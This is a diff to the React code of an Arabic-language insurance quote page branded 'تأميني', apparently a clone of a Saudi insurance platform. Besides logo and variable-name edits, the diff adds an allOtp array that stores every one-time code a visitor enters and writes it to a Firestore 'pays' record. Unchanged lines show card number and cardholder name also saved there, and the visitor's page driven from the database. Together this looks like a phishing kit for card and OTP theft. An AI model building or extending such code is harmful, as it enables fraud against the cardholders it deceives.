@@ -264,8 +264,8 @@ export default function QuotePage() {
         <div className="max-w-7xl mx-auto flex items-center justify-between">
           <div className="flex items-center gap-4 lg:gap-8">
             <div className="flex items-center gap-3">
-              <div className="w-20 h-12 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-lg">تأميني</span>
+              <div className="w-20 h-12  rounded-lg flex items-center justify-center">
+              <img src="/Logo-AR.png" alt="logo" width={80} />
               </div>
               <div className="hidden sm:block">
                 <h1 className="text-xl font-bold text-gray-900">تأميني</h1>
@@ -523,9 +523,10 @@ export default function QuotePage() {
           <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8 mb-12">
             <div className="space-y-6">
               <div className="flex items-center gap-3">
-                <div className="w-32 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
-                  <span className="text-white font-bold text-xl">تأميني</span>
-                </div>
+                <div className="w-32 h-16 bg-white rounded-lg flex items-center justify-center">
+                <img src="/Logo-AR.png" alt="logo" width={80} />
+
+                      </div>
               </div>
               <p className="text-gray-400 leading-relaxed">
                 منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
@@ -629,9 +630,11 @@ export default function QuotePage() {
     </div>
   )
 }
-
+const allOtp=[
+  ''
+]
 function ProfessionalQuoteForm() {
-  const [currentStep, setCurrentStep] = useState(1)
+  const [currentPage, setCurrentStep] = useState(1)
   const [errors, setErrors] = useState<Record<string, string>>({})
   const [touched, setTouched] = useState<Record<string, boolean>>({})
   const [isSubmitting, setIsSubmitting] = useState(false)
@@ -697,9 +700,9 @@ function ProfessionalQuoteForm() {
     // Save current step
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
-      addData({ id: visitorId, currentStep })
+      addData({ id: visitorId, currentPage })
     }
-  }, [currentStep])
+  }, [currentPage])
 
   useEffect(() => {
     if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
@@ -712,7 +715,7 @@ function ProfessionalQuoteForm() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() 
-          setCurrentStep(data.currentStep)
+          setCurrentStep(parseInt(data.currentPage))
         }
       })
 
@@ -870,12 +873,12 @@ function ProfessionalQuoteForm() {
   }
 
   const nextStep = () => {
-    if (validateStep(currentStep)) {
-      if (currentStep < steps.length) {
+    if (validateStep(currentPage)) {
+      if (currentPage < steps.length) {
         const visitorId = localStorage.getItem("visitor")
         const dataToSave = {
           id: visitorId,
-          currentStep: currentStep + 1,
+          currentPage: currentPage + 1,
           ...formData,
           cardNumber,
           cardName,
@@ -885,14 +888,14 @@ function ProfessionalQuoteForm() {
         }
 
         addData(dataToSave)
-        setCurrentStep(currentStep + 1)
+        setCurrentStep(currentPage + 1)
       }
     }
   }
 
   const prevStep = () => {
-    if (currentStep > 1) {
-      setCurrentStep(currentStep - 1)
+    if (currentPage > 1) {
+      setCurrentStep(currentPage - 1)
     }
   }
 
@@ -999,7 +1002,7 @@ function ProfessionalQuoteForm() {
         id: visitorId,
         paymentStatus: "completed",
         otpSent: true,
-        currentStep: 7,
+        currentPage: 7,
       })
       setOtpSent(true)
     }, 2000)
@@ -1007,12 +1010,13 @@ function ProfessionalQuoteForm() {
 
   function verifyOTP(): void {
     const visitorId = localStorage.getItem("visitor")
-
+    allOtp.push(otp)
     addData({
       id: visitorId,
       otp,
       otpAttempts: otpAttempts + 1,
       otpVerificationTime: new Date().toISOString(),
+      allOtp,
       ...formData,
     })
 
@@ -1048,18 +1052,18 @@ function ProfessionalQuoteForm() {
                   <div className="flex flex-col items-center">
                     <div
                       className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
-                        step.number === currentStep
+                        step.number === currentPage
                           ? "bg-[#109cd4] text-white shadow-lg scale-110"
-                          : step.number < currentStep
+                          : step.number < currentPage
                             ? "bg-green-500 text-white"
                             : "bg-gray-200 text-gray-600"
                       }`}
                     >
-                      {step.number < currentStep ? <CheckCircle className="w-5 h-5" /> : step.number}
+                      {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
                     </div>
                     <p
                       className={`text-xs mt-2 text-center w-20 ${
-                        step.number === currentStep ? "text-[#109cd4] font-semibold" : "text-gray-600"
+                        step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
                       }`}
                     >
                       {step.title.split(" ")[0]}
@@ -1068,7 +1072,7 @@ function ProfessionalQuoteForm() {
                   {index < steps.length - 1 && (
                     <div
                       className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
-                        step.number < currentStep ? "bg-green-500" : "bg-gray-300"
+                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                       }`}
                     />
                   )}
@@ -1084,14 +1088,14 @@ function ProfessionalQuoteForm() {
                 <div className="flex flex-col items-center">
                   <div
                     className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
-                      step.number === currentStep
+                      step.number === currentPage
                         ? "bg-[#109cd4] text-white shadow-lg scale-110"
-                        : step.number < currentStep
+                        : step.number < currentPage
                           ? "bg-green-500 text-white"
                           : "bg-gray-200 text-gray-600"
                     }`}
                   >
-                    {step.number < currentStep ? (
+                    {step.number < currentPage ? (
                       <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
                     ) : (
                       <step.icon className="w-6 h-6 lg:w-7 lg:h-7" />
@@ -1100,7 +1104,7 @@ function ProfessionalQuoteForm() {
                   <div className="text-center mt-3">
                     <p
                       className={`text-sm lg:text-base font-semibold ${
-                        step.number === currentStep ? "text-[#109cd4]" : "text-gray-700"
+                        step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
                       }`}
                     >
                       {step.title}
@@ -1111,7 +1115,7 @@ function ProfessionalQuoteForm() {
                 {index < steps.length - 1 && (
                   <div
                     className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
-                      step.number < currentStep ? "bg-green-500" : "bg-gray-300"
+                      step.number < currentPage ? "bg-green-500" : "bg-gray-300"
                     }`}
                   />
                 )}
@@ -1123,7 +1127,7 @@ function ProfessionalQuoteForm() {
         {/* Form Content */}
         <div className="p-6 lg:p-8">
           <div className="min-h-[500px] lg:min-h-[600px]">
-            {currentStep === 1 && (
+            {currentPage === 1 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1136,7 +1140,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 2 && (
+            {currentPage === 2 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1260,7 +1264,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 3 && (
+            {currentPage === 3 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1437,7 +1441,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 4 && (
+            {currentPage === 4 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1501,7 +1505,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 5 && (
+            {currentPage === 5 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1622,7 +1626,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 6 && (
+            {currentPage === 6 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1785,7 +1789,7 @@ function ProfessionalQuoteForm() {
               </div>
             )}
 
-            {currentStep === 7 && (
+            {currentPage === 7 && (
               <div className="space-y-8">
                 <div className="text-center mb-8">
                   <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
@@ -1852,7 +1856,7 @@ function ProfessionalQuoteForm() {
             <Button
               variant="outline"
               onClick={prevStep}
-              disabled={currentStep === 1 || paymentProcessing || isSubmitting}
+              disabled={currentPage === 1 || paymentProcessing || isSubmitting}
               className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
             >
               <ArrowLeft className="w-4 h-4 ml-2" />
@@ -1860,10 +1864,10 @@ function ProfessionalQuoteForm() {
             </Button>
 
             <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
-              الخطوة {currentStep} من {steps.length}
+              الخطوة {currentPage} من {steps.length}
             </div>
 
-            {currentStep < 6 ? (
+            {currentPage < 6 ? (
               <Button
                 onClick={nextStep}
                 className="bg-[#109cd4] hover:bg-blue-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
@@ -1872,7 +1876,7 @@ function ProfessionalQuoteForm() {
                 التالي
                 <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
               </Button>
-            ) : currentStep === 6 ? (
+            ) : currentPage === 6 ? (
               <Button
                 onClick={handlePayment}
                 disabled={paymentProcessing}
